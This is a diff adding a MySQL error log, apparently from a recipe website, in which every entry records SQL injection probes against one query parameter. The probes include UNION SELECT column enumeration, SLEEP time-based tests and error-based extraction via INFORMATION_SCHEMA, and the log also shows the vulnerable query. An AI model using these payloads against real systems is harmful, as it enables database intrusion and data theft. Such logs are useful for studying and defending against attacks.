@@ -1,0 +1,251 @@
+Time : 08:38:29
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '50),SLEEP(5),3331)=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_activ' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 AND 3331=IF((62 50),SLEEP(5),3331)=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:37:16
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NUL' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:37:14
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NUL' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:37:12
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NUL' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:37:09
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NUL' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:37:07
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NUL' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:37:04
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NUL' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:37:00
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NUL' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:36:57
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NUL' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:36:55
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#=0)' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:36:52
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#=0) AND ' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:36:47
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#=0) AND d_id=' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:36:45
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#=0) AND d_id=file_' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:36:43
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#=0) AND d_id=file_d_id ' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:36:41
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#=0) AND d_id=file_d_id AND f' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:36:39
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#=0) AND d_id=file_d_id AND file_t' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:36:36
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#=0) AND d_id=file_d_id AND file_type='' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:36:33
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL#=0) AND d_id=file_d_id AND file_type='recip' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:36:30
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL#=0) AND d_id=file_d_id AND file_type='recipeCove' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:36:28
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL#=0) AND d_id=file_d_id AND file_type='recipeCover' AN' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:36:25
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_a' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:36:22
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'ORDER BY 1#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORD' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 ORDER BY 1#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:36:18
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NUL' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- fjKr=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:36:16
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NUL' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- SQgW=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:36:14
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NUL' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- zPwv=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:36:11
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NUL' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- snia=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:36:09
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NUL' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- rExb=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:36:07
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NUL' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- MuSY=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:36:05
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NUL' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- nokW=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:36:02
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NUL' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- sBPP=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:36:00
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- P' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- PxPW=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:35:57
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- HCCD=0' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- HCCD=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:35:54
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- JFTc=0) AND' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- JFTc=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:35:51
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- KamX=0) AND d_id' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- KamX=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:35:49
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- PQkq=0) AND d_id=file' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- PQkq=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:35:43
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- kzos=0) AND d_id=file_d_id' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- kzos=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:35:39
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- BFtz=0) AND d_id=file_d_id AND ' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- BFtz=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:35:35
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- bKtM=0) AND d_id=file_d_id AND file_' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- bKtM=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:35:31
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL-- ygJG=0) AND d_id=file_d_id AND file_type=' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL,NULL-- ygJG=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:35:29
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL-- dAbt=0) AND d_id=file_d_id AND file_type='reci' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL,NULL-- dAbt=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:35:25
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL-- vLJH=0) AND d_id=file_d_id AND file_type='recipeCov' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL,NULL-- vLJH=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:35:21
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL-- tyxU=0) AND d_id=file_d_id AND file_type='recipeCover' A' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 UNION ALL SELECT NULL-- tyxU=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:35:16
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'ORDER BY 1-- wyJo=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 ORDER BY 1-- wyJo=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:34:15
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'recipeCover' AND d_active=1 ORDER BY d_date DESC' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4%';SELECT SLEEP(5)#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:34:14
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '';SELECT SLEEP(5)#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_activ' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4';SELECT SLEEP(5)#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:34:14
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '');SELECT SLEEP(5)#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_acti' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4');SELECT SLEEP(5)#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:34:13
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ';SELECT SLEEP(5)#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4;SELECT SLEEP(5)#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:34:13
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'SELECT SLEEP(5)#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4);SELECT SLEEP(5)#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:33:57
+SQLSTATE[21000]: Cardinality violation: 1242 Subquery returns more than 1 row
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || (SELECT 5095 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(5095=5095,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 08:33:48
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND (SELECT 9604 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(9604=96' at line 1
